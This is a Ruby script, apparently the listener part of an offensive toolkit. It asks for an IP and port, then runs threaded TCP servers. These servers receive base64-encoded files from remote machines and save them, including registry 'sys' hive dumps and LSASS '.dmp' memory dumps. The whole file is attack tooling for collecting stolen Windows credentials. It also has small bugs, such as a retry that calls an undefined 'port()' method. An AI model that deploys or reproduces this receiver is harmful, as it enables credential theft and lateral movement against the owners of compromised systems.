#!/usr/bin/env ruby
require './core'
include MainCommands
class ServerSetUp
  def get_host()
    host_name = [(get_input("Enter the host ip to listen on: ") ), $stdin.gets.rstrip][1]
    ip = host_name.split('.')
    if ip[0] == nil or ip[1] == nil or ip[2] == nil or ip[3] == nil 
      print_error("Not a valid IP\n") 
      get_host()
    end 
    print_success("Using #{host_name} as server\n")
    return host_name
  end
  def get_port()
    port = [(get_input("Enter the port you would like to use or leave blank for [443]: ") ), $stdin.gets.rstrip][1]
    if port == ''
      port = '443'
      print_success("Using #{port}\n")
      return port
    elsif not (1..65535).cover?(port.to_i)
      print_error("Not a valid port\n")
      sleep(1)
      port()
    else 
    print_success("Using #{port}\n")
    return port
    end 
  end
  def hash_server(port)
    print_info("Starting Server!\n")
    server = TCPServer.open(port.to_i)
    x = 0
    loop{
      Thread.start(server.accept) do |client|
        file_name = client.recv(1024)
        print_success("Got #{file_name.strip} file!\n")
        print_info("Getting Data!\n")
        out_put = client.gets()
        print_info("Writing to File\n")
        File.open("#{file_name.strip}#{x}","w") {|f| f.write(Base64.decode64(out_put))}
        print_success("File Done!\n")
        x += 1 if file_name == "sys\r\n"
      end
    }
    rescue => error
      print_error(error)
  end
  def lsass_server(port)
    print_info("Starting Server!\n")
    server = TCPServer.open(port.to_i)
    x = 0
    loop{   
      Thread.start(server.accept) do |client|
        file_name = client.recv(1024) 
        print_success("Got #{file_name.strip} file!\n")
        print_info("Getting Data\n")
        out_put = client.gets()
        print_info("Writing to File\n")
        File.open("#{file_name.strip}#{x}.dmp","w") {|f| f.write(Base64.decode64(out_put))}
        print_success("File Done!\n")
        x += 1
      end   
    }
    rescue => error
    print_error(error)
  end
end
